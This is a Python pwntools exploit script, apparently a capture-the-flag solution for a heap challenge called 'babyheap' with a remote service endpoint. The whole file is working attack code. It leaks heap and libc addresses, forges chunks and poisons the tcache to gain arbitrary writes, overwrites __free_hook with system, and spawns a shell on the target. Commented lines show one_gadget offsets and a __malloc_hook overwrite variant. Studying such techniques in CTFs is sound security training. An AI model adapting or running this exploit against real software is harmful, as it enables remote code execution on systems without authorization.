#!/usr/bin/python3

from pwn import *

"""
0xe6ce3 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6ce6 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6ce9 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""

one_gadget_delta = 0xe6ce9

context.arch = 'amd64'
# context.log_level = 'debug'

if args.REMOTE:
    p = remote('babyheap.f2tc.com', 3282)
    libc = ELF('libc.so')
else:
    elf = ELF('gh-babyheap')
    p = process(elf.path)
    libc = elf.libc

    if args.GDB:
        gdb.attach(p, '''
            brva 0x11f4
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'> ', choice)

def create(size, data):
    choose(b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(index):
    choose(b'2')
    p.sendlineafter(b': ', str(index).encode())

def show(index):
    choose(b'3')
    p.sendlineafter(b': ', str(index).encode())

def exit():
    choose(b'4')

for _ in range(2):
    create(0x328, b'A' * 0x48 + b'\n')

for i in range(2):
    delete(i)

# 1. Leak heap address

create(0x328, b'\n')

show(0)

heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
heap_addr = heap_leak - 0x2a0

log.info(f'heap_leak = {hex(heap_leak)}')
log.info(f'heap @ {hex(heap_addr)}')

delete(0)

# 2. Leak libc address
for _ in range(15):
    create(0x328, b'B' * 0x48 + b'\n')

for i in range(16):
    delete(i)

create(0x48, b'\n')

show(0)

libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ebbe0
one_gadget_addr = libc.address + one_gadget_delta
io_str_jumps = libc.sym.__malloc_hook + 0x19f0
bin_sh_addr = libc.search(b'/bin/sh').__next__()

log.info(f'libc_leak = {hex(libc_leak)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'/bin/sh @ {hex(bin_sh_addr)}')
log.info(f'system @ {hex(libc.sym.system)}')
log.info(f'one_gadget @ {hex(one_gadget_addr)}')
log.info(f'__malloc_hook @ {hex(libc.sym.__malloc_hook)}')
log.info(f'__free_hook @ {hex(libc.sym.__free_hook)}')
log.info(f'_IO_str_jumps @ {hex(io_str_jumps)}')

# 3. Coalesce the last chunks into TOP.

delete(0)
delete(16)

# 4. Craft fake chunks

padding_one = b'C' * 0x2f8
fake_chunk_one = p64(0x31) + b'C' * 0x20 + p64(0x30) + b'\n'
content_one = padding_one + fake_chunk_one

create(0x328, content_one)
create(0x328, b'C' * 0x48 + b'\n')

delete(1)

fake_addr = heap_addr + 0x1280 + 0x10 + 0x60
victim_addr = heap_addr + 0x1580

log.info(f'fake @ {hex(fake_addr)}')
log.info(f'victim @ {hex(victim_addr)}')

padding_two = b'C' * 0x60 + p64(victim_addr) + b'C' * 0x290

fake_fw = fake_addr - 0x18
fake_bk = fake_addr - 0x10
fake_data_two = p64(fake_fw) + p64(fake_bk) + b'C' * 0x10

fake_chunk_two = p64(0x31) + fake_data_two + p64(0x30) + b'C' * 2
content_two = padding_two + fake_chunk_two

create(0x328, content_two)
create(0x78, b'D' * 0x48 + b'\n') # Chunk 2

# 4. Fill tcache[0x300]

for _ in range(7):
    create(0x2f8, b'E' * 0x48 + b'\n')

for i in range(3, 10):
    delete(i)

# 5. Coalesce with victim chunk

delete(0)

# 6. Clean unsorted bin

create(0x78, b'F' * 0x48 + b'\n') # Chunk 0 (overlapped by chunk 1)

create(0x2a8, b'F' * 0x48 + b'\n') # Chunk 3
delete(3)

"""
# Prepare to overwrite __malloc_hook
poison_addr = libc.sym.__malloc_hook - 0x23
padding_four = b'H' * 0x23
content_four = padding_four + p64(one_gadget_addr) + b'\n'
"""

"""
pwndbg> x/2xg 0x0000563f60d15590-8
0x563f60d15588:	0x0000000000000081	0x4646464646464646
pwndbg> x/2xg 0x0000563f60d15290-8
0x563f60d15288:	0x0000000000000331	0x4343434343434343
pwndbg> x/2xg 0x0000563f60d15940-8
0x563f60d15938:	0x0000000000000081	0x4444444444444444
"""

def write_buffer(poison_addr, content_four, size, n, must_create=False):
    # 7. Poison tcache[0x80]

    if must_create:
        create(size, b'X' * 0x48 + b'\n')

    delete(n) # Size 0x80
    # log.info(f'free {n}')
    delete(1) # Size 0x330
    # log.info(f'free 1')
    delete(0) # Size 0x80
    # log.info(f'free 0')

    log.info(f'poison = {hex(poison_addr)}')

    # 8. Poison tcache[size+8]

    padding_three = b'G' * 0x2f8
    fake_chunk_three = p64(n+9) + p64(poison_addr) + b'\n'
    content_three = padding_three + fake_chunk_three

    create(0x328, content_three) # Chunk 0

    # 9. Overwrite poison_addr with content

    create(size, b'H' * 0x48 + b'\n') # Chunk 1
    create(size, content_four) # Chunk n

# Overwrite __malloc_hook
# write_buffer(poison_addr, content_four, 0x78, 2)

# Create one chunk of 0x80 and other of 0x2b0

init_target = io_str_jumps + 173 + 8
content = b'\x00' * 0x76 + b'\x61\x03' + b'A' + b'\n'

target = init_target
write_buffer(target, content, 0x78, 2)

target += 0x7e

# 10. Switch chunks size to 0x360

## After first overwrite
## Chunk of 0x330 bytes - index 0
## Victim chunk - index 1
## Support chunk - index n

def reset_victim():
    delete(0)

    padding_five = b'I' * 0x2f8
    fake_chunk_five = p64(0x361) + b'I' * 8 + b'\n'
    content_five = padding_five + fake_chunk_five

    create(0x328, content_five)

## Only indexes 0, 1, and 2 are taken.

# 11. Create 0x360 chunks

content = b'\x00' * 0x356 + b'\x61\x03' + b'A' + b'\n'

## Just for testing purposes
#reset_victim()
#write_buffer(target, content, 0x358, 3, True)
#target += 0x356
#reset_victim()
#write_buffer(target, content, 0x358, 4, True)

index = 3
while libc.sym.__free_hook > target + 0x356:
    reset_victim()
    write_buffer(target, content, 0x358, index, True)
    target += 0x356
    index += 1

delta = libc.sym.__free_hook-target
log.info(f'delta = {hex(delta)}')

padding = b'\x00' * delta
system_addr = p64(libc.sym.system)
content = padding + system_addr + b'\n'

reset_victim()
write_buffer(target, content, 0x358, index, True)

## Only for debugging purposes
# exit()

index += 1

create(0x38, b'/bin/sh\00' + b'\n')
delete(index)

p.interactive()
